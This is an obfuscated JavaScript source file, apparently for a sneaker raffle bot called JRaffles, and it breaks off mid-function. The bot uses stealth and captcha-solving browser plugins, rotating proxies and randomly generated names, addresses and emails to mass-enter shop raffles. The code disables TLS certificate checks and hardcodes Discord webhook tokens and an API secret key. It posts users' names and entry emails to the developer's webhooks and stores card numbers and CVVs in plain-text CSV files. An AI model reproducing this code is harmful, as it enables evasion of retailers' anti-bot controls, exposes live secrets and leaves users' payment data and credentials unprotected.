process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x13dabd = require('fs'), _0x4e7a4b = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x2424cb(_0x55fa00) {
    const _0x3bfc5f = _0x13dabd['createWriteStream'](_0x55fa00, { 'flags': 'a' }), _0x257252 = console['log'];
    console['log'] = function () {
        const _0x4b93ce = Array['prototype']['slice']['call'](arguments), _0x3e3faf = _0x4b93ce['join']('\x20') + '\x0a';
        _0x3bfc5f['write'](_0x3e3faf), _0x257252['apply'](console, _0x4b93ce);
    };
}
_0x2424cb('../logs/log\x20' + _0x4e7a4b);
var _0x454518 = require('tough-cookie'), _0x108c6b = require('node-imap'), _0x107b98 = require('util')['inspect'];
const _0x2e7895 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x4877ab } = require('discord.js');
var _0x313a64 = require('exe');
const { execFile: _0xa14671 } = require('child_process'), _0x1528cf = require('puppeteer-extra'), _0x2a16d3 = require('puppeteer-extra-plugin-recaptcha'), _0x3af7cd = require('puppeteer-extra-plugin-stealth'), _0x34d98c = require('chalk'), _0x3b7620 = require('node-bash-title'), _0x1a729a = require('axios'), _0x3d5697 = require('papaparse');
var _0x4c513a = require('random-name');
const _0x5b7593 = require('request');
var _0x4111eb = require('prompt');
const _0x15c37f = _0x5b7593['jar']();
var _0x50b722 = {};
const _0x115f51 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x503dc5 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x21bfa4 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x3fafad = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x540715 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x2c1584 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x27291d = 'https://discord.com/api/webhooks/', _0x2ff53d = '' + _0x27291d + _0x21bfa4, _0x96b204 = '' + _0x27291d + _0x3fafad, _0xee2818 = '' + _0x27291d + _0x115f51, _0x5e1645 = '' + _0x27291d + _0x503dc5, _0x471d14 = '' + _0x27291d + _0x540715, _0x1fcdbe = '' + _0x27291d + _0x2c1584;
const _0x40c3a7 = JSON['parse'](_0x13dabd['readFileSync']('../package.json', 'utf-8')), _0x1f5435 = _0x40c3a7['version'];
var _0x55dc9b, _0x40851, _0x157c5c, _0x3afae8, _0x562e58, _0x245fbc, _0x4ee077, _0x97d5a9;
const _0x251c41 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x2ebadb = ![];
const _0x1b1202 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x4cba54 = '0123456789';
var _0x2828d4 = _0x1b1202['split']('');
const _0x528834 = require('auto-git-update'), _0x4240fe = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x30686b = new _0x528834(_0x4240fe);
async function _0xca6926() {
    _0x562e58 = _0x13dabd['readdirSync']('../proxies'), _0x3afae8 = _0x13dabd['readdirSync']('../tasks'), !_0x13dabd['existsSync']('../accounts/fenom.csv') && _0x13dabd['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x13dabd['existsSync']('../accounts/paypal.csv') && _0x13dabd['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x13dabd['existsSync']('../accounts/bstn.csv') && _0x13dabd['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x13dabd['existsSync']('../accounts/eql.csv') && _0x13dabd['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x13dabd['existsSync']('../failed-tasks.csv') && _0x13dabd['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x13dabd['existsSync']('../successful-tasks.csv') && _0x13dabd['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x50b722 = JSON['parse'](_0x13dabd['readFileSync']('../settings.json', 'utf-8')), !_0x50b722['delay'] && (_0x50b722['delay'] = 0x3c, _0x13dabd['writeFileSync']('../settings.json', JSON['stringify'](_0x50b722, null, 0x2))), !_0x50b722['masterMail'] && (_0x50b722['masterMail'] = 'yourmail@gmail.com', _0x13dabd['writeFileSync']('../settings.json', JSON['stringify'](_0x50b722, null, 0x2))), !_0x50b722['masterPassword'] && (_0x50b722['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x13dabd['writeFileSync']('../settings.json', JSON['stringify'](_0x50b722, null, 0x2))), !_0x50b722['captchaKey'] && (_0x50b722['captchaKey'] = '', _0x13dabd['writeFileSync']('../settings.json', JSON['stringify'](_0x50b722, null, 0x2))), !_0x50b722['useRandomProxy'] && (_0x50b722['useRandomProxy'] = !![], _0x13dabd['writeFileSync']('../settings.json', JSON['stringify'](_0x50b722, null, 0x2))), !_0x50b722['shuffleTasks'] && (_0x50b722['shuffleTasks'] = ![], _0x13dabd['writeFileSync']('../settings.json', JSON['stringify'](_0x50b722, null, 0x2))), !_0x50b722['webhook'] && (_0x50b722['webhook'] = '', _0x13dabd['writeFileSync']('../settings.json', JSON['stringify'](_0x50b722, null, 0x2))), _0x50b722['delay'] <= 0x1388 && (_0x50b722['delay'] = _0x50b722['delay'] * 0x3e8), _0x50b722['AfewDelay'] && (delete _0x50b722['AfewDelay'], _0x13dabd['writeFileSync']('../settings.json', JSON['stringify'](_0x50b722, null, 0x2))), _0x50b722['MahaDelay'] && (delete _0x50b722['MahaDelay'], _0x13dabd['writeFileSync']('../settings.json', JSON['stringify'](_0x50b722, null, 0x2))), _0x50b722['footshopDelay'] && (delete _0x50b722['footshopDelay'], _0x13dabd['writeFileSync']('../settings.json', JSON['stringify'](_0x50b722, null, 0x2))), _0x50b722['MahaDelay'] = _0x50b722['delay'], _0x27291d = _0x50b722['webhook'], _0x245fbc = _0x50b722['licenseKey'];
}
let _0x474e28, _0x2c361a = [], _0x1c2184;
const _0xfa5357 = _0x5b6cab => new Promise(_0x21358c => setTimeout(_0x21358c, _0x5b6cab));
function _0xe7ad75(_0x47c301, _0x29b8bd) {
    return Math['floor'](Math['random']() * (_0x29b8bd - _0x47c301 + 0x1) + _0x47c301);
}
function _0x56de24(_0x597c78) {
    let _0x21f1e4 = _0x597c78['length'], _0x3044d0;
    while (_0x21f1e4 != 0x0) {
        _0x3044d0 = Math['floor'](Math['random']() * _0x21f1e4), _0x21f1e4--, [_0x597c78[_0x21f1e4], _0x597c78[_0x3044d0]] = [
            _0x597c78[_0x3044d0],
            _0x597c78[_0x21f1e4]
        ];
    }
    return _0x597c78;
}
async function _0x1be7d5(_0x8b5f1d) {
    return _0x1a729a['get']('https://api.hyper.co/v4/licenses/' + _0x8b5f1d, { 'headers': { 'Authorization': 'Bearer\x20' + _0x251c41 } })['then'](_0x55786f => _0x55786f['data'])['catch'](() => null);
}
;
async function _0x46fed6(_0x12de21) {
    console['clear']();
    if (_0x12de21 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x24858c = await _0x4111eb['get']('License');
        if (_0x24858c['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0xfa5357(0xbb8), _0x46fed6(_0x12de21);
        _0x12de21 = _0x24858c['License'], _0x50b722['licenseKey'] = _0x12de21, _0x245fbc = _0x12de21, _0x13dabd['writeFileSync']('../settings.json', JSON['stringify'](_0x50b722));
    }
    console['log']('Checking\x20license\x20' + _0x245fbc + '...'), await _0xfa5357(0x320);
    const _0x3128df = await _0x1be7d5(_0x12de21);
    _0x4ee077 = JSON['stringify'](_0x3128df['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x97d5a9 = JSON['stringify'](_0x3128df['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x3128df)
        return console['log']('License\x20not\x20found');
    if (!_0x3128df['user'])
        return console['log']('License\x20not\x20bound');
    return _0x3128df['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x2ebadb = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x2ebadb = ![]);
}
async function _0x2ed3f8() {
    var _0x214d29 = await _0x4111eb['get']('Module');
    return console['clear'](), _0x214d29['Module'];
}
;
async function _0x499691() {
    var _0x17fdf2 = await _0x4111eb['get']('Setting');
    return console['clear'](), _0x17fdf2['Setting'];
}
async function _0x333b4a(_0x47ee6a) {
    var _0x3139be = [];
    for (file of _0x3afae8) {
        var _0x4034f3 = _0x13dabd['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x3d5697['parse'](_0x4034f3, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x47ee6a['store'] && _0x3139be['push'](file);
    }
    !_0x3139be['length'] == 0x0 && (_0x3afae8 = _0x3139be);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x12f3eb = 0x0; _0x12f3eb < _0x3afae8['length']; _0x12f3eb++) {
        console['log']('\x20(' + _0x12f3eb + ')\x20' + _0x3afae8[_0x12f3eb]);
    }
    console['log']('');
    var _0x5b448f = await _0x4111eb['get']('Task');
    if (_0x5b448f['Task'] > _0x3afae8['length'] - 0x1 || isNaN(_0x5b448f['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0xfa5357(0x3e8), _0x333b4a();
    var _0x1e9113 = _0x13dabd['readFileSync']('../tasks/' + _0x3afae8[_0x5b448f['Task']], 'utf-8');
    return _0x157c5c = _0x3d5697['parse'](_0x1e9113, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x34d98c['blue'](_0x3afae8[_0x5b448f['Task']])), _0x55dc9b = _0x3afae8[_0x5b448f['Task']], _0x157c5c;
}
async function _0xf9bb70() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0xd7abaa = 0x0; _0xd7abaa < _0x562e58['length']; _0xd7abaa++) {
        console['log']('\x20(' + _0xd7abaa + ')\x20' + _0x562e58[_0xd7abaa]);
    }
    console['log']('');
    var _0x9ce965 = await _0x4111eb['get']('Proxies');
    if (_0x9ce965['Proxies'] > _0x562e58['length'] - 0x1 || isNaN(_0x9ce965['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0xfa5357(0x3e8), _0xf9bb70();
    var _0x581741 = _0x13dabd['readFileSync']('../proxies/' + _0x562e58[_0x9ce965['Proxies']], 'utf-8')['split']('\x0a');
    let _0x1d514b = _0x581741['map']((_0x9ef6ef, _0x38937c) => {
        sanatizeProxy = _0x9ef6ef['replace']('\x0d', '');
        if (_0x581741[_0x38937c + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x40851 = _0x562e58[_0x9ce965['Proxies']], console['clear'](), _0x1d514b;
}
async function _0xfb743e() {
    var _0x38c533 = await _0x4111eb['get']('Value');
    return console['clear'](), _0x38c533['Value'];
}
async function _0x2cb1d6(_0x2e3db6) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x1387e3 = 0x0; _0x1387e3 < _0x2e3db6['length']; _0x1387e3++) {
        console['log']('\x20(' + _0x1387e3 + ')\x20[' + _0x2e3db6[_0x1387e3]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x272002 = await _0x4111eb['get']('Module');
    return _0x272002['Module'];
}
async function _0x69c930() {
    var _0x181e8f = await _0x4111eb['get']('Password');
    return console['clear'](), _0x181e8f['Password'];
}
;
async function _0x4990ee() {
    var _0x258d6d = await _0x4111eb['get']('Links');
    return _0x258d6d['Links'];
}
;
async function _0x3b93b0() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x957579 = 0x0; _0x957579 < _0x2c361a['length']; _0x957579++) {
        console['log']('\x20(' + _0x957579 + ')\x20' + _0x2c361a[_0x957579]);
    }
    ;
    console['log']();
    let _0x2e37a4 = await _0x4111eb['get']('Product');
    return console['clear'](), _0x2e37a4['Product'];
}
;
function _0x391006() {
    var _0xf02c4c = new Date(Date['now']())['toLocaleTimeString']();
    return _0xf02c4c;
}
;
function _0xdf115c() {
    var _0x3c89b0 = new Date(Date['now']())['toLocaleString']();
    return _0x3c89b0['replace'](',', '');
}
async function _0x33437b(_0x541a72, _0x3f5137) {
    let _0x23a395 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x1f5435 != 'devkey') {
        await _0x1a729a['post'](_0x541a72, _0x3f5137, _0x23a395);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0xc964cf(_0x486238, _0x43c660, _0x23c574, _0x32f728, _0x15b531) {
    if (!_0x32f728 && _0x23c574 == 'dev') {
        var _0x346c27 = new _0x4877ab()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x43c660['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x43c660['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x486238['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x50b722['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x4ee077,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x486238['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x486238['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x1f5435,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x346c27['data'];
    } else {
        if (_0x32f728 && _0x23c574 == 'dev') {
            var _0x346c27 = new _0x4877ab()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x43c660['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x4ee077,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x43c660['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x486238['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x50b722['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x15b531,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x486238['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x486238['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x1f5435,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x346c27['data'];
        } else {
            if (_0x23c574 == 'pub') {
                var _0x346c27 = new _0x4877ab()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x43c660['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x43c660['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x486238['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x50b722['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x486238['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x1f5435,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x346c27['data'];
            } else {
                if (_0x23c574 == 'acc' && !_0x32f728) {
                    var _0x346c27 = new _0x4877ab()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x43c660['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x4ee077,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x43c660['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x50b722['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x1f5435,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x346c27['data'];
                } else {
                    if (_0x23c574 == 'acc' && _0x32f728) {
                        var _0x346c27 = new _0x4877ab()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x43c660['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x4ee077,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x15b531,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x43c660['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x50b722['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x1f5435,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x346c27['data'];
                    } else {
                        if (_0x23c574 == 'open') {
                            var _0x346c27 = new _0x4877ab()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x97d5a9)['addFields']({
                                'name': 'User',
                                'value': '' + _0x4ee077,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x1f5435,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x346c27['data'];
                        } else {
                            if (!_0x32f728 && _0x23c574 == 'ver') {
                                var _0x346c27 = new _0x4877ab()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x43c660['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x4ee077,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x43c660['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x50b722['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x1f5435,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x346c27['data'];
                            } else {
                                if (_0x32f728 && _0x23c574 == 'ver') {
                                    var _0x346c27 = new _0x4877ab()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x43c660['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x4ee077,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x15b531,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x43c660['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x50b722['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x1f5435,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x346c27['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x559c6d(_0x36e6ea, _0x4663e3) {
    var _0x8c2929 = _0x36e6ea[_0x4663e3]['Address1']['split'](''), _0x5152e8 = _0x36e6ea[_0x4663e3]['Address2']['split'](''), _0x15e1b9 = _0x36e6ea[_0x4663e3]['Email']['split']('@');
    for (var _0x2e99ef = 0x0; _0x2e99ef < _0x8c2929['length']; _0x2e99ef++) {
        if (_0x8c2929[_0x2e99ef] == 'X') {
            var _0x54cf51 = Math['round'](Math['random']() * (_0x1b1202['length'] - 0x1));
            _0x8c2929[_0x2e99ef] = _0x2828d4[_0x54cf51];
        }
    }
    ;
    for (var _0x2e99ef = 0x0; _0x2e99ef < _0x5152e8['length']; _0x2e99ef++) {
        if (_0x5152e8[_0x2e99ef] == 'X') {
            var _0x54cf51 = Math['round'](Math['random']() * (_0x1b1202['length'] - 0x1));
            _0x5152e8[_0x2e99ef] = _0x2828d4[_0x54cf51];
        }
    }
    ;
    _0x36e6ea[_0x4663e3]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x36e6ea[_0x4663e3]['FirstName'] = _0x4c513a['first']());
    _0x36e6ea[_0x4663e3]['LastName']['toUpperCase']() == 'RANDOM' && (_0x36e6ea[_0x4663e3]['LastName'] = _0x4c513a['last']());
    _0x15e1b9[0x0]['toUpperCase']() == 'RANDOM' ? _0x15e1b9[0x0] = '' + _0x4c513a['first']() + _0x4c513a['last']() + _0xe7ad75(0x1, 0x270f) + '@' : _0x15e1b9[0x0] = _0x15e1b9[0x0] + '@';
    _0x36e6ea[_0x4663e3]['Email'] = _0x15e1b9['join'](''), _0x36e6ea[_0x4663e3]['Address1'] = _0x8c2929['join'](''), _0x36e6ea[_0x4663e3]['Address2'] = _0x5152e8['join']('');
    _0x36e6ea[_0x4663e3]['Phone'] == 'RANDOM' && (_0x36e6ea[_0x4663e3]['Phone'] = '0' + _0xe7ad75(0x5f5e100, 0x3b9ac9ff));
    if (_0x36e6ea[_0x4663e3]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x908d79 = _0xe7ad75(0x1, 0x270f);
        _0x36e6ea[_0x4663e3]['Follower'] = '' + _0x4c513a['first']() + _0x4c513a['last']() + _0x908d79 + '\x20';
    }
    _0x36e6ea[_0x4663e3]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x36e6ea[_0x4663e3]['HouseNumber'] = _0xe7ad75(0x1, 0xc8));
    if (_0x36e6ea[_0x4663e3]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x51c314 = Math['round'](Math['random']() * (_0x1b1202['length'] - 0x1)), _0x319a2d = _0x2828d4[_0x51c314];
        _0x36e6ea[_0x4663e3]['Address1'] = _0x4c513a['last']() + 'straat', _0x36e6ea[_0x4663e3]['Zip'] == '' && (_0x36e6ea[_0x4663e3]['Postcode'] = _0xe7ad75(0x3e8, 0x270f) + '\x20' + _0x319a2d + _0x319a2d, _0x36e6ea[_0x4663e3]['Zip'] = _0x36e6ea[_0x4663e3]['Postcode']), _0x36e6ea[_0x4663e3]['HouseNumber'] = '' + _0xe7ad75(0x1, 0xc8);
    }
    return;
}
;
async function _0x3003c7(_0x3ca12d, _0x3bc1d4) {
    _0x13dabd['appendFileSync']('../failed-tasks.csv', _0xdf115c() + ',' + _0x3bc1d4['store'] + ',' + _0x3bc1d4['name'] + ',' + _0x3ca12d['Url'] + ',' + _0x3ca12d['Size'] + ',' + _0x3ca12d['Follower'] + ',' + _0x3ca12d['FirstName'] + ',' + _0x3ca12d['LastName'] + ',' + _0x3ca12d['Address1'] + ',' + _0x3ca12d['Address2'] + ',' + _0x3ca12d['HouseNumber'] + ',' + _0x3ca12d['Zip'] + ',' + _0x3ca12d['City'] + ',' + _0x3ca12d['State'] + ',' + _0x3ca12d['Country'] + ',' + _0x3ca12d['Phone'] + ',' + _0x3ca12d['Email'] + ',' + _0x3ca12d['Password'] + ',' + _0x3ca12d['PaymentMethod'] + ',' + _0x3ca12d['CardType'] + ',' + _0x3ca12d['NameOnCard'] + ',' + _0x3ca12d['CardNumber'] + ',' + _0x3ca12d['ExpiryDate'] + ',' + _0x3ca12d['CVV'] + ',' + _0x3ca12d['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x253d32(_0x206e7c, _0x1f9156) {
    _0x13dabd['appendFileSync']('../successful-tasks.csv', _0xdf115c() + ',' + _0x1f9156['store'] + ',' + _0x1f9156['name'] + ',' + _0x206e7c['Url'] + ',' + _0x206e7c['Size'] + ',' + _0x206e7c['Follower'] + ',' + _0x206e7c['FirstName'] + ',' + _0x206e7c['LastName'] + ',' + _0x206e7c['Address1'] + ',' + _0x206e7c['Address2'] + ',' + _0x206e7c['HouseNumber'] + ',' + _0x206e7c['Zip'] + ',' + _0x206e7c['City'] + ',' + _0x206e7c['State'] + ',' + _0x206e7c['Country'] + ',' + _0x206e7c['Phone'] + ',' + _0x206e7c['Email'] + ',' + _0x206e7c['Password'] + ',' + _0x206e7c['PaymentMethod'] + ',' + _0x206e7c['CardType'] + ',' + _0x206e7c['NameOnCard'] + ',' + _0x206e7c['CardNumber'] + ',' + _0x206e7c['ExpiryDate'] + ',' + _0x206e7c['CVV'] + ',' + _0x206e7c['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x1d6bf4() {
    let _0x34adc8 = proxyFile['split']('\x0a'), _0x11937e = _0x34adc8['map']((_0x92c0cc, _0x48f040) => {
        sanatizeProxy = _0x92c0cc['replace']('\x0d', '');
        if (_0x34adc8[_0x48f040 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x11937e;
}
;
async function _0x2f2518(_0x47e0e0, _0x1f3056) {
    if (_0x148754 != 'yes')
        var _0x148754 = '', _0xf109ac = 0x0;
    async function _0x3ad1ae() {
        var _0x21d05a = _0x13dabd['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x4947f3 = _0x3d5697['parse'](_0x21d05a, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x4d4b32 = 0x0; _0x4d4b32 < _0x4947f3['length']; _0x4d4b32++) {
            console['log']('(' + _0x4d4b32 + ')\x20' + _0x4947f3[_0x4d4b32]['Email']);
        }
        console['log']('\x0a(' + _0x4947f3['length'] + ')\x20' + _0x34d98c['cyan']('Add\x20a\x20new\x20account'));
        let _0x32b829 = await _0x4111eb['get']('Option');
        if (_0x32b829['Option'] < _0x4947f3['length'])
            return _0x4947f3[_0x32b829['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x442b6d = {}, _0x2ee0dc = await _0x4111eb['get']('Email');
        _0x442b6d['Email'] = _0x2ee0dc['Email'];
        var _0x596459 = Math['round'](Math['random']() * (_0x1f3056['length'] - 0x1));
        _0x442b6d['Proxy'] = _0x1f3056[_0x596459], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x3c33a2 = await _0x4111eb['get']('Password');
